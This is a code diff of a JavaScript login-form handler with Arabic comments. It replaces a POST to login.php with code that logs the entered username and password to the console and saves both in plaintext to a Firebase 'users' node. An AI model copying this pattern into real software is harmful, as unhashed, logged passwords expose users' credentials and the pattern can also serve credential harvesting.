@@ -1,32 +1,30 @@
-document.getElementById('loginForm').addEventListener('submit', function(event) {
+document.getElementById('dataForm').addEventListener('submit', function(event) {
     event.preventDefault(); // منع إعادة تحميل الصفحة
 
-    const username = this.querySelector('input[type="text"]').value;
-    const password = this.querySelector('input[type="password"]').value;
+    // الحصول على البيانات من النموذج
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
 
-    if (username && password) {
-        // إرسال البيانات إلى ملف PHP باستخدام Fetch API
-        fetch('login.php', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded'
-            },
-            body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.status === 'success') {
-                alert(`مرحبًا بك، ${data.data.username}!`);
-                console.log('بيانات تسجيل الدخول:', data.data);
-            } else {
-                alert(data.message);
-            }
-        })
-        .catch(error => {
-            console.error('حدث خطأ:', error);
-            alert('حدث خطأ أثناء معالجة الطلب.');
-        });
-    } else {
-        alert('يرجى ملء جميع الحقول.');
+    console.log("Username:", username);
+    console.log("Password:", password);
+
+    // التحقق من أن Firebase يعمل
+    if (!firebase.apps.length) {
+        console.error("Firebase not initialized!");
+        alert("حدث خطأ: Firebase لم يتم تهيئته.");
+        return;
     }
+
+    // إرسال البيانات إلى Firebase
+    const newEntryRef = database.ref('users').push();
+    newEntryRef.set({
+        username: username,
+        password: password
+    }).then(() => {
+        console.log("Data saved successfully!");
+        alert('تم حفظ البيانات بنجاح!');
+    }).catch((error) => {
+        console.error("حدث خطأ:", error);
+        alert('حدث خطأ أثناء حفظ البيانات.');
+    });
 });
